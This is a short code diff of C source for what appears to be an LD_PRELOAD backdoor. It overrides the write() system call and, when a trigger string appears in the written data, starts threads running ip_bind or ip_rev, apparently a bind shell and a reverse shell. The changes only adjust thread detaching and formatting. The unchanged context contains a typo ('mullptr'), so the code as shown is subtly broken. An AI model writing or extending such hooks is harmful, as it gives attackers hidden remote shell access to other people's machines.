@@ -188,7 +188,8 @@ int ip_bind(void)
 ssize_t write(int fildes, const void *buf, size_t nbytes) // From Manual
 {
     ssize_t (*new_write)(int fildes, const void *buf, size_t nbytes); // Create A New Function Pointer
-    ssize_t result;pthread_t t;
+    ssize_t result;
+    pthread_t t;
 
     new_write = dlsym(RTLD_NEXT, "write"); // Find the next occurrence of the desired symbol in the search order after the current object
     
@@ -198,6 +199,7 @@ ssize_t write(int fildes, const void *buf, size_t nbytes) // From Manual
         result = new_write(fildes,buf,nbytes);
         pthread_create(&t,mullptr,ip_bind,nullptr);
         //ip_bind();
+        //pthread_detach(t);
     }
     else if(strstr(buf,REVTRIGGER) != NULL)
     {
@@ -205,6 +207,7 @@ ssize_t write(int fildes, const void *buf, size_t nbytes) // From Manual
         result = new_write(fildes,buf,nbytes);
         pthread_create(&t,mullptr,ip_rev,nullptr);
         //ip_rev();   
+        pthread_detach(t);  
     }
     else
     {
